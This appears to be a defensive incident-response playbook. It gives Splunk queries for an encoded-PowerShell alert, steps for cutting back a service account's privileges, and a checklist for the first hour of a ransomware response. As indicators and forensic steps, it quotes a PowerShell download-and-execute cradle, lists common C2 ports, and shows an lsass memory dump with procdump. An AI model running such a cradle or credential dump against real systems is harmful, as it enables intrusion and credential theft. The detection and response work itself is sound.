# Security Scenario Examples

## Scenario 1 — Splunk SIEM Alert: Encoded PowerShell Execution (§9)

**Step 1: Immediate context pull**

```splunk
index=windows EventCode=4688 (CommandLine="*-EncodedCommand*" OR CommandLine="*-enc *")
host="finance-server-03"
| table _time, user, CommandLine, ParentProcessName, NewProcessName
| sort -_time
| head 20
```

**Step 2: Decode the payload**

```bash
# From Splunk result, copy the base64 string after -EncodedCommand
echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ..." | base64 -d | iconv -f UTF-16LE -t UTF-8
# Review decoded command — is it legitimate admin script or malicious?
```

**Step 3: Check for lateral movement**

```splunk
# Did this host make new network connections after the PowerShell event?
index=network_traffic src_ip="10.1.2.45"  // finance-server-03 IP
earliest=-2h latest=now
| stats count by dest_ip, dest_port, _time
| where dest_port IN (4444, 8080, 443, 1337)  // common C2 ports
```

**Triage decision tree:**
- Decoded command = legitimate IT automation script signed by known admin → **False positive; whitelist and document**
- Decoded command = `IEX(New-Object Net.WebClient).DownloadString('http://...')` → **Active compromise; isolate immediately**
- Unknown/obfuscated further → **Escalate to Tier 2; isolate as precaution**

## Scenario 2 — Service Account Least Privilege Remediation (§9)

**Step 1: Map exact permissions needed**

```powershell
# What does the ETL job actually do? Check its database connections
# Run on the ETL server — see what resources it accesses
Get-WinEvent -LogName Security -FilterXPath "
  *[System[(EventID=4624)]]
  and *[EventData[Data[@Name='TargetUserName']='svc_reporting']]" |
  Select-Object TimeCreated, Message | Format-List
```

**Step 2: Create least-privilege replacement**

```powershell
# Create new service account with minimum required permissions only
New-ADUser -Name "svc_etl_reporting" `
  -AccountPassword (ConvertTo-SecureString "$(New-Guid)" -AsPlainText -Force) `
  -PasswordNeverExpires $false `
  -CannotChangePassword $true `
  -Enabled $true

# Grant ONLY what's needed — e.g., read access to specific DB schema
# DO NOT add to any admin groups
```

**Step 3: Grant specific SQL permissions**

```sql
-- In SQL Server: grant minimum read access to specific tables only
CREATE LOGIN [DOMAIN\svc_etl_reporting] FROM WINDOWS;
USE ReportingDB;
CREATE USER [svc_etl_reporting] FOR LOGIN [DOMAIN\svc_etl_reporting];
-- Grant read-only on specific schema, NOT db_datareader on all tables
GRANT SELECT ON SCHEMA::ReportingData TO [svc_etl_reporting];
```

**Step 4: Switch and disable old account**

```powershell
# After confirming ETL works with new account, disable svc_reporting
Disable-ADAccount -Identity "svc_reporting"
# Wait 2 weeks for any batch jobs to surface issues, then delete
# Document in change record: svc_reporting Domain Admin removed [DATE] [TICKET]
```

## Scenario 3 — Ransomware: First 60 Minutes (§9)

**T+0: Alert confirmation (first 5 minutes)**

```
1. Confirm it's ransomware — check for ransom note (README.txt, DECRYPT_FILES.html)
2. Declare P1 Incident — notify: CISO, IT Director, Legal, HR Business Partner
3. Do NOT reboot affected machines — preserves memory forensics
4. Do NOT pay ransom yet (possibly ever) — escalate to CISO decision
```

**T+5: Immediate containment**

```bash
# Option A: Firewall-level isolation (fastest)
# Block affected subnet at perimeter + core switch

# Option B: AD account disable for affected users
Disable-ADAccount -Identity "affected_user1", "affected_user2"
# This prevents credential reuse for lateral movement

# Option C: Network segment quarantine via NAC
# Move affected endpoints to quarantine VLAN
```

**T+15: Evidence preservation**

```powershell
# Preserve memory on affected Windows systems (before any reboot!)
.\procdump64.exe -ma lsass.exe lsass_dump.dmp  # Credentials in memory
.\winpmem_mini_x64_rc2.exe memdump.raw          # Full memory image

# Preserve event logs before they roll over
wevtutil export-log Security C:\IR\security.evtx
wevtutil export-log System C:\IR\system.evtx
wevtutil export-log Application C:\IR\application.evtx
```

**T+30: Attack vector identification**

```splunk
# Find patient zero — which machine was encrypted first?
index=windows EventCode=4663 Object_Name="*.encrypted"
| stats min(_time) as first_seen by host
| sort first_seen
| head 5

# Check for initial access vector on patient zero
index=* host="[PATIENT_ZERO_HOSTNAME]" earliest=-24h
| search (EventCode=4624 OR EventCode=4625 OR "phishing" OR "attachment")
```

**Backup verification:**

```
- Confirm backups are OFFLINE and not connected to infected network
- Verify last clean backup timestamp
- Estimate RPO: time between last backup and first infection
- Do NOT connect backup systems to network until ransomware eradicated
```
